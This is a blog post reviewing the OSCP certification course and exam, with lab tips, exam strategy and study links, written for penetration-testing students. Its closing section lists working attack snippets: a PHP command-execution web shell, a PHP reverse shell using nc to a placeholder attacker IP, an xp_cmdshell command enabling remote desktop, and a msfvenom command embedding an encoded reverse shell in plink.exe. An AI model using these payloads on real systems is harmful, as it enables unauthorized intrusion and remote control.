---
layout:     post
title:      "OSCP & PWK Review"
#subtitle:   "Pentesting"
date:       2017-06-07
author:     "Tech"
header-img: "img/post-OSCP.jpg"
tags:
    - Pentesting
    - Exploit Development
    - Shellcoding
---


![](/img/in-post/post-js-version/oscp.png)

This course exceeded my expectations.

This we'll be a very quick review for those looking to expand into pen-testing while going for the bad-ass of certifications.

I am now studying for my SLAE, and starting the OSCE right after. Look out for those post within a few months! Continuing back on the OSCP!

# The Lab:

You have 50+ machines to play around with at your disposal! Each machine has a unique trait about them and you should try to get as much needed. There are a few networks in which you can pivot around and have fun. I have comproise all the more notable machines in the labs: gh0st, pain, humble, sufferance, edb, ect. The list goes on, but here are a few tips for you regarding the labs:

 * For pivoting, using proxychains can be...time consuming to say the least. It gets very intersting when you are all setup and another student has reverted one of the boxs you were pivoting on. SSHUTTLE has saved me plenty of time and easy to get into, the kali lab vm now comes with it pre-installed.
 * Try not to use the forums. Even though the admins are quick to delete post with hints, some can get past them. Your objective is to learn as much as you can. Try and find your own methodology before looking for hints.
 * Use Metasploit if you absolutely need to. What I mean, is most of the ruby metasploit scripts can be converted to python if you simply just read it. If you work with this mind-set you'll do good for the rest of the course and exam.

# Exam:

Leading up to the exam day will have you double thinking if your ready or not, questions like:

 * Is my enumeration scripts ready?
 * Should I keep privilege escalation testing?
    *  The answer is yes, yes you should.
 * What happens if one of the machines is like gh0st?
    * Don't want to spoil this answer, but if you have compromised gh0st in the labs.. you'll know what I mean.

For those who don't know, the OSCP is an arduous 24 hour practical exam followed by 24 hours to submit the report. In the exam you’ll be given a small number of machine to exploit, and you’ll require 70⁄100 points to pass. Use of certain tools (e.g. metasploit) is restricted, so make sure you’ve got a solid methodology and aren’t dependent on these!

My exam started at 12:00PM, and rightfully so I received my email seconds into it. Once you get the VPN situated and have your 5 machines with their IP and point value, it's time to decide what to do first. I got system on the buffer overflow machine within 45 minutes, the second machine fell in 20 minutes after that. Within 3 hours of starting, I already have enough points to past if my lab/exercise documentation were good (they were!). 5 Hours in and I got my 4th machine, this puts me around 90⁄100 points. I started typing up my report and once I finished that, I looked over the last machine and got that one shortly after. All in all, ~8 hours total, and the whole network compromised and pentest report finished. It was a glorious day.

#### Here are some TIPs:

 * Have a good sleep the night before, really.
 * Attack the higher point value machines first, if you can known down and secure yourself a pass within a few hours, everything else will crumble with *confidence*.
 * I personally didn't end up using any of the scripts I made, don't get hanged up on them.
 * Document as you go, the boring side of pentesting is the documentation. Do it as you go and it wouldn't hinder you after.
 * Remember the word "Methodology" and understand it. This is the one what people fail to do. This exam is to test and see how quickly you can adapt to a situation to figure out what to do. You need to walk into this exam thinking differently, if you see something that seems to easy, most likely it's just a rabbit hole.
 * There’s a mountain of resources out there that are worth their weight in gold. Those I kept coming back to include:
     * [Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
     * [Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
     * [Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
     * [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
     * [LinuxPrivChecker](www.securitysift.com/download/linuxprivchecker.py)


#### Commands that might save you:

```python
<?php  
$output=shell_exec("ls -lah /usr/bin");echo "<pre>$output<//pre>";
//be sure to remove the second slash.
?>
```

```python
<?php  
$output=shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx.xxx.xxx.xxx 4444 >/tmp/f");echo "<pre>$output<//pre>";
//be sure to remove the second slash.
?>
```

```python
payload = """python -c ‘import pty; pty.spawn("/bin/sh")’""" # to exploit only on root
```

```python
xp_cmdshell '﻿C:\WINNT\system32\regedt32.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'  
```

```python
windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell  
windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)  
```

```python
msfvenom -p windows/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe > shell.exe  
```

![](/img/in-post/post-js-version/oscp1.png)
